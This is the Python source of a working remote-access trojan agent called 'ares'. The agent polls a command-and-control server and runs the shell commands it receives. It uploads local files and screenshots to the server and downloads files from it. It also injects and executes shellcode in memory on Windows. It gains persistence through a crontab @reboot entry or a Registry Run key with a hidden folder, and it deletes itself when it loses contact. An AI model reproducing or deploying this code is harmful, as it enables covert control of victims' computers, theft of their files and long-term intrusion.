#!/usr/bin/env python2
# coding: utf-8

import requests
import time
import os
import subprocess
import platform
import shutil
import sys
import traceback
import threading
import uuid
import io
import zipfile
import tempfile
import socket
import getpass
import mss
import ctypes

import config


def threaded(func):
    def wrapper(*_args, **kwargs):
        t = threading.Thread(target=func, args=_args)
        t.start()
        return
    return wrapper


class Agent(object):

    def __init__(self):
        self.idle = False
        self.silent = False
        self.platform = platform.system() + " " + platform.release()
        self.last_active = time.time()
        self.failed_connections = 0
        self.uid = self.get_UID()
        self.hostname = socket.gethostname()
        self.username = getpass.getuser()

    def get_install_dir(self):
        install_dir = None
        if platform.system() == 'Linux':
            install_dir = self.expand_path('~/.ares')
        elif platform.system() == 'Windows':
            install_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
        if os.path.exists(install_dir):
            return install_dir
        else:
            return None

    def is_installed(self):
        return self.get_install_dir()

    def get_consecutive_failed_connections(self):
        if self.is_installed():
            install_dir = self.get_install_dir()
            check_file = os.path.join(install_dir, "failed_connections")
            if os.path.exists(check_file):
                with open(check_file, "r") as f:
                    return int(f.read())
            else:
                return 0
        else:
            return self.failed_connections

    def update_consecutive_failed_connections(self, value):
        if self.is_installed():
            install_dir = self.get_install_dir()
            check_file = os.path.join(install_dir, "failed_connections")
            with open(check_file, "w") as f:
                f.write(str(value))
        else:
            self.failed_connections = value

    def log(self, to_log):
        """ Write data to agent log """
        print(to_log)

    def get_UID(self):
        """ Returns a unique ID for the agent """
        return getpass.getuser() + "_" + str(uuid.getnode())

    def server_hello(self):
        """ Ask server for instructions """
        req = requests.post(config.SERVER + '/api/' + self.uid + '/hello',
                verify=config.TLS_VERIFY,
                json={'platform': self.platform, 'hostname': self.hostname, 'username': self.username})
        return req.text

    def send_output(self, output, newlines=True):
        """ Send console output to server """
        if self.silent:
            self.log(output)
            return
        if not output:
            return
        if newlines:
            output += str("\n\n")
        req = requests.post(config.SERVER + '/api/' + self.uid + '/report',
                verify=config.TLS_VERIFY,
                data={'output': output})

    def expand_path(self, path):
        """ Expand environment variables and metacharacters in a path """
        return os.path.expandvars(os.path.expanduser(path))

    @threaded
    def runcmd(self, cmd):
        """ Runs a shell command and returns its output """
        try:
            proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, err = proc.communicate()
            output = (out + err)
            if os.name == "nt":
                output = output.decode('cp850')
            else:
                output = output.decode('utf-8', errors='replace')
            self.send_output(output)
        except Exception as exc:
            self.send_output(traceback.format_exc())

    def cd(self, directory):
        """ Change current directory """
        os.chdir(self.expand_path(directory))

    @threaded
    def upload(self, file):
        """ Uploads a local file to the server """
        file = self.expand_path(file)
        try:
            if os.path.exists(file) and os.path.isfile(file):
                self.send_output("[*] Uploading %s..." % file)
                requests.post(config.SERVER + '/api/' + self.uid + '/upload',
                    verify=config.TLS_VERIFY,
                    files={'uploaded': open(file, 'rb')})
            else:
                self.send_output('[!] No such file: ' + file)
        except Exception as exc:
            self.send_output(traceback.format_exc())

    @threaded
    def download(self, file, destination=''):
        """ Downloads a file the the agent host through HTTP(S) """
        try:
            destination = self.expand_path(destination)
            if not destination:
                destination= file.split('/')[-1]
            self.send_output("[*] Downloading %s..." % file)
            req = requests.get(file, stream=True)
            with open(destination, 'wb') as f:
                for chunk in req.iter_content(chunk_size=8000):
                    if chunk:
                        f.write(chunk)
            self.send_output("[+] File downloaded: " + destination)
        except Exception as exc:
            self.send_output(traceback.format_exc())

    def persist(self):
        """ Installs the agent """
        if not getattr(sys, 'frozen', False):
            self.send_output('[!] Persistence only supported on compiled agents.')
            return
        if self.is_installed():
            self.send_output('[!] Agent seems to be already installed.')
            return
        if platform.system() == 'Linux':
            persist_dir = self.expand_path('~/.ares')
            if not os.path.exists(persist_dir):
                os.makedirs(persist_dir)
            agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
            shutil.copyfile(sys.executable, agent_path)
            os.system('chmod +x ' + agent_path)
            os.system('(crontab -l;echo @reboot ' + agent_path + ')|crontab')
        elif platform.system() == 'Windows':
            persist_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
            if not os.path.exists(persist_dir):
                os.makedirs(persist_dir)                        # Make folder
                os.system('attrib +h "{}"'.format(persist_dir)) # Hide folder
            agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
            shutil.copyfile(sys.executable, agent_path)
            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares /t REG_SZ /d \"%s\"" % agent_path
            subprocess.Popen(cmd, shell=True)
        else:
            self.send_output('[!] Not supported.')
            return
        self.send_output('[+] Agent installed.')

    def clean(self):
        """ Uninstalls the agent """ 
        if platform.system() == 'Linux':
            persist_dir = self.expand_path('~/.ares')
            if os.path.exists(persist_dir):
                shutil.rmtree(persist_dir)
            os.system('crontab -l|grep -v ' + persist_dir + '|crontab')
        elif platform.system() == 'Windows':
            persist_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
            cmd = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares"
            subprocess.Popen(cmd, shell=True)
            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v ares /t REG_SZ /d \"cmd.exe /c del /s /q %s & rmdir %s\"" % (persist_dir, persist_dir)
            subprocess.Popen(cmd, shell=True)
        self.send_output('[+] Agent removed successfully.')

    def exit(self):
        """ Kills the agent """
        self.send_output('[+] Exiting... (bye!)')
        sys.exit(0)

    @threaded
    def zip(self, zip_name, to_zip):
        """ Zips a folder or file """
        try:
            zip_name = self.expand_path(zip_name)
            to_zip = self.expand_path(to_zip)
            if not os.path.exists(to_zip):
                self.send_output("[+] No such file or directory: %s" % to_zip)
                return
            self.send_output("[*] Creating zip archive...")
            zip_file = zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED)
            if os.path.isdir(to_zip):
                relative_path = os.path.dirname(to_zip)
                for root, dirs, files in os.walk(to_zip):
                    for file in files:
                        zip_file.write(os.path.join(root, file), os.path.join(root, file).replace(relative_path, '', 1))
            else:
                zip_file.write(to_zip, os.path.basename(to_zip))
            zip_file.close()
            self.send_output("[+] Archive created: %s" % zip_name)
        except Exception as exc:
            self.send_output(traceback.format_exc())
   
    @threaded
    def screenshot(self):
        """ Takes a screenshot and uploads it to the server"""
        tmp_file = tempfile.NamedTemporaryFile()
        screenshot_file = tmp_file.name + ".png"
        tmp_file.close()
        with mss.mss() as sct:
            sct.shot(mon=-1, output=screenshot_file)
        self.upload(screenshot_file)

    @threaded
    def execshellcode(self, shellcode_str):
        """ Executes given shellcode string in memory """
        shellcode = shellcode_str.replace('\\x', '')
        shellcode = bytes.fromhex(shellcode)
        shellcode = bytearray(shellcode)
        ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                                  ctypes.c_int(len(shellcode)),
                                                  ctypes.c_int(0x3000),
                                                  ctypes.c_int(0x40))
        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                             buf,
                                             ctypes.c_int(len(shellcode)))
        ctypes.windll.kernel32.CreateThread(
             ctypes.c_int(0),
             ctypes.c_int(0),
             ctypes.c_int(ptr),
             ctypes.c_int(0),
             ctypes.c_int(0),
             ctypes.pointer(ctypes.c_int(0)))
        self.send_output("[+] Shellcode executed.")

    def help(self):
        """ Displays the help """
        self.send_output(config.HELP)

    def run(self):
        """ Main loop """
        self.silent = True
        if config.PERSIST:
            try:
                self.persist()
            except:
                self.log("Failed executing persistence")
        self.silent = False
        while True:
            try:
                todo = self.server_hello()
                self.update_consecutive_failed_connections(0)
                # Something to do ?
                if todo:
                    commandline = todo
                    self.idle = False
                    self.last_active = time.time()
                    self.send_output('$ ' + commandline)
                    split_cmd = commandline.split(" ")
                    command = split_cmd[0]
                    args = []
                    if len(split_cmd) > 1:
                        args = split_cmd[1:]
                    try:
                        if command == 'cd':
                            if not args:
                                self.send_output('usage: cd </path/to/directory>')
                            else:
                                self.cd(" ".join(args))
                        elif command == 'upload':
                            if not args:
                                self.send_output('usage: upload <localfile>')
                            else:
                                self.upload(args[0],)
                        elif command == 'download':
                            if not args:
                                self.send_output('usage: download <remote_url> <destination>')
                            else:
                                if len(args) == 2:
                                    self.download(args[0], args[1])
                                else:
                                    self.download(args[0])
                        elif command == 'clean':
                            self.clean()
                        elif command == 'persist':
                            self.persist()
                        elif command == 'exit':
                            self.exit()
                        elif command == 'zip':
                            if not args or len(args) < 2:
                                self.send_output('usage: zip <archive_name> <folder>')
                            else:
                                self.zip(args[0], " ".join(args[1:]))
                        elif command == 'python':
                            if not args:
                                self.send_output('usage: python <python_file> or python <python_command>')
                            else:
                                self.python(" ".join(args))
                        elif command == 'screenshot':
                            self.screenshot()
                        elif command == 'execshellcode':
                            if not args:
                                self.send_output('usage: execshellcode <shellcode>')
                            else:
                                self.execshellcode(args[0])
                        elif command == 'help':
                            self.help()
                        else:
                            self.runcmd(commandline)
                    except Exception as exc:
                        self.send_output(traceback.format_exc())
                else:
                    if self.idle:
                        time.sleep(config.HELLO_INTERVAL)
                    elif (time.time() - self.last_active) > config.IDLE_TIME:
                        self.log("Switching to idle mode...")
                        self.idle = True
                    else:
                        time.sleep(1)
            except Exception as exc:
                failed_connections = self.get_consecutive_failed_connections()
                failed_connections += 1
                self.update_consecutive_failed_connections(failed_connections)
                self.log("Failed to contact %s [%s/%s]" % (config.SERVER, failed_connections, config.MAX_FAILED_CONNECTIONS))
                if failed_connections > config.MAX_FAILED_CONNECTIONS:
                    self.silent = True
                    self.clean()
                    self.exit()
                time.sleep(config.HELLO_INTERVAL)


def main():
    agent = Agent()
    agent.run()


if __name__ == "__main__":
    main()
